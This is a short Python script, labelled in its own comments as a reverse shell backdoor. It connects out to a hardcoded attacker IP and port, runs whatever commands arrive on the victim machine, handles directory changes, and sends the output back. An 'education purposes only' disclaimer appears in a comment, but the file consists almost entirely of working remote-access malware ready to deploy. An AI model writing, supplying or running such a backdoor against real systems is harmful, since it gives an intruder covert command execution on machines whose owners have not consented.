
# This script is a simple reverse shell backdoor that connects to an attacker's IP and listens for commands.
# The attacker can execute commands on the target machine and receive the output.
# The backdoor can also change directories using the "cd" command
#TODO this script is only for education purposes, do not use it for malicious purposes i'm not responsible for any damage caused by this script

import socket
import subprocess
import os
import shlex

IP = "192.168.0.112"  # Replace with your attacker's IP
PORT = 7777           # Replace with your desired port

def connect():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP, PORT))
    except Exception as e:
        print(f"Failed to create/connect the socket: {str(e)}")
        return

    while True:
        try:
            command = s.recv(1024).decode()
        except Exception as e:
            print(f"Failed to receive command: {str(e)}")
            break

        if command.lower() == "exit":
            break
        elif command[:2].lower() == "cd":
            try:
                os.chdir(command[3:])
                s.send(f"Changed directory to {os.getcwd()}\n".encode())
            except FileNotFoundError as e:
                s.send(f"Directory not found: {str(e)}\n".encode())
            except Exception as e:
                s.send(f"Failed to change directory: {str(e)}\n".encode())
        else:
            try:
                output = subprocess.getoutput(shlex.split(command))
                s.send(output.encode())
            except Exception as e:
                s.send(f"Error executing command: {str(e)}\n".encode())

    s.close()

connect()


